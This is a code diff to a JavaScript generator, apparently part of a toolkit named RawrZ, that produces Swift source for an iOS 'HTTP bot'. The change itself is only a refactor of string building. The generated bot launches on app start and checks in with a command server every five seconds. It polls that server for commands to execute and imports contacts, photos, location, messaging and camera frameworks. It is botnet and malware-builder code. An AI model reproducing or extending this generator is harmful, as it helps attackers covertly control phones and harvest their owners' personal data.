@@ -671,109 +671,109 @@ class HTTPBotGenerator {
     generateSwiftHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateSwiftFeatures(features);
         
-        return `// RawrZ HTTP Bot - Swift Implementation (iOS)
-// Generated: ${timestamp}
-// Bot ID: ${botId}
-
-import Foundation
-import UIKit
-import CoreLocation
-import Contacts
-import MessageUI
-import Photos
-import AVFoundation
-
-class RawrZHTTPBot: NSObject {
-    private let serverUrl: String = "${config.server || 'http://localhost:8080'}"
-    private let botId: String = "${botId}"
-    private let botName: String = "${config.name || 'HTTPBot'}"
-    private var isRunning: Bool = false
-    private var locationManager: CLLocationManager?
-    private var timer: Timer?
-    
-    override init() {
-        super.init()
-        ${featureCode.init}
-    }
-    
-    func run() {
-        print("RawrZ HTTP Bot \\(botId) starting...")
-        isRunning = true
-        
-        // Start heartbeat timer
-        timer = Timer.scheduledTimer(withTimeInterval: 5.0, repeats: true) { _ in
-            self.sendHeartbeat()
-            self.checkForCommands()
-            ${featureCode.execute}
-        }
-    }
-    
-    private func sendHeartbeat() {
-        let data = [
-            "bot_id": botId,
-            "status": "alive",
-            "timestamp": Int(Date().timeIntervalSince1970)
-        ]
-        sendHTTPRequest(endpoint: "/bot/heartbeat", data: data)
-    }
-    
-    private func checkForCommands() {
-        let response = sendHTTPRequest(endpoint: "/bot/commands/\\(botId)", data: nil)
-        if !response.isEmpty {
-            executeCommand(response)
-        }
-    }
-    
-    private func executeCommand(_ command: String) {
-        print("Executing command: \\(command)")
-        // Command execution logic here
-    }
-    
-    private func sendHTTPRequest(endpoint: String, data: [String: Any]?) -> String {
-        guard let url = URL(string: serverUrl + endpoint) else { return "" }
-        
-        var request = URLRequest(url: url)
-        request.httpMethod = data != nil ? "POST" : "GET"
-        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-        
-        if let data = data {
-            do {
-                request.httpBody = try JSONSerialization.data(withJSONObject: data)
-            } catch {
-                print("Error serializing data: \\(error)")
-                return ""
-            }
-        }
-        
-        let semaphore = DispatchSemaphore(value: 0)
-        var responseData = ""
-        
-        URLSession.shared.dataTask(with: request) { data, response, error in
-            if let data = data {
-                responseData = String(data: data, encoding: .utf8) ?? ""
-            }
-            semaphore.signal()
-        }.resume()
-        
-        semaphore.wait()
-        return responseData
-    }
-    
-    " + featureCode.methods + "
-}
-
-// iOS App Delegate Integration
-@UIApplicationMain
-class AppDelegate: UIResponder, UIApplicationDelegate {
-    var window: UIWindow?
-    var bot: RawrZHTTPBot?
-    
-    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
-        bot = RawrZHTTPBot()
-        bot?.run()
-        return true
-    }
-}`;
+        return '// RawrZ HTTP Bot - Swift Implementation (iOS)\n' +
+            '// Generated: ' + timestamp + '\n' +
+            '// Bot ID: ' + botId + '\n' +
+            '\n' +
+            'import Foundation\n' +
+            'import UIKit\n' +
+            'import CoreLocation\n' +
+            'import Contacts\n' +
+            'import MessageUI\n' +
+            'import Photos\n' +
+            'import AVFoundation\n' +
+            '\n' +
+            'class RawrZHTTPBot: NSObject {\n' +
+            '    private let serverUrl: String = "' + (config.server || 'http://localhost:8080') + '"\n' +
+            '    private let botId: String = "' + botId + '"\n' +
+            '    private let botName: String = "' + (config.name || 'HTTPBot') + '"\n' +
+            '    private var isRunning: Bool = false\n' +
+            '    private var locationManager: CLLocationManager?\n' +
+            '    private var timer: Timer?\n' +
+            '    \n' +
+            '    override init() {\n' +
+            '        super.init()\n' +
+            '        ' + featureCode.init + '\n' +
+            '    }\n' +
+            '    \n' +
+            '    func run() {\n' +
+            '        print("RawrZ HTTP Bot " + botId + " starting...")\n' +
+            '        isRunning = true\n' +
+            '        \n' +
+            '        // Start heartbeat timer\n' +
+            '        timer = Timer.scheduledTimer(withTimeInterval: 5.0, repeats: true) { _ in\n' +
+            '            self.sendHeartbeat()\n' +
+            '            self.checkForCommands()\n' +
+            '            ' + featureCode.execute + '\n' +
+            '        }\n' +
+            '    }\n' +
+            '    \n' +
+            '    private func sendHeartbeat() {\n' +
+            '        let data = [\n' +
+            '            "bot_id": botId,\n' +
+            '            "status": "alive",\n' +
+            '            "timestamp": Int(Date().timeIntervalSince1970)\n' +
+            '        ]\n' +
+            '        sendHTTPRequest(endpoint: "/bot/heartbeat", data: data)\n' +
+            '    }\n' +
+            '    \n' +
+            '    private func checkForCommands() {\n' +
+            '        let response = sendHTTPRequest(endpoint: "/bot/commands/" + botId, data: nil)\n' +
+            '        if !response.isEmpty {\n' +
+            '            executeCommand(response)\n' +
+            '        }\n' +
+            '    }\n' +
+            '    \n' +
+            '    private func executeCommand(_ command: String) {\n' +
+            '        print("Executing command: " + command)\n' +
+            '        // Command execution logic here\n' +
+            '    }\n' +
+            '    \n' +
+            '    private func sendHTTPRequest(endpoint: String, data: [String: Any]?) -> String {\n' +
+            '        guard let url = URL(string: serverUrl + endpoint) else { return "" }\n' +
+            '        \n' +
+            '        var request = URLRequest(url: url)\n' +
+            '        request.httpMethod = data != nil ? "POST" : "GET"\n' +
+            '        request.setValue("application/json", forHTTPHeaderField: "Content-Type")\n' +
+            '        \n' +
+            '        if let data = data {\n' +
+            '            do {\n' +
+            '                request.httpBody = try JSONSerialization.data(withJSONObject: data)\n' +
+            '            } catch {\n' +
+            '                print("Error serializing data: " + error.localizedDescription)\n' +
+            '                return ""\n' +
+            '            }\n' +
+            '        }\n' +
+            '        \n' +
+            '        let semaphore = DispatchSemaphore(value: 0)\n' +
+            '        var responseData = ""\n' +
+            '        \n' +
+            '        URLSession.shared.dataTask(with: request) { data, response, error in\n' +
+            '            if let data = data {\n' +
+            '                responseData = String(data: data, encoding: .utf8) ?? ""\n' +
+            '            }\n' +
+            '            semaphore.signal()\n' +
+            '        }.resume()\n' +
+            '        \n' +
+            '        semaphore.wait()\n' +
+            '        return responseData\n' +
+            '    }\n' +
+            '    \n' +
+            '    ' + featureCode.methods + '\n' +
+            '}\n' +
+            '\n' +
+            '// iOS App Delegate Integration\n' +
+            '@UIApplicationMain\n' +
+            'class AppDelegate: UIResponder, UIApplicationDelegate {\n' +
+            '    var window: UIWindow?\n' +
+            '    var bot: RawrZHTTPBot?\n' +
+            '    \n' +
+            '    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {\n' +
+            '        bot = RawrZHTTPBot()\n' +
+            '        bot?.run()\n' +
+            '        return true\n' +
+            '    }\n' +
+            '}';
     }
 
     generateSwiftFeatures(features) {
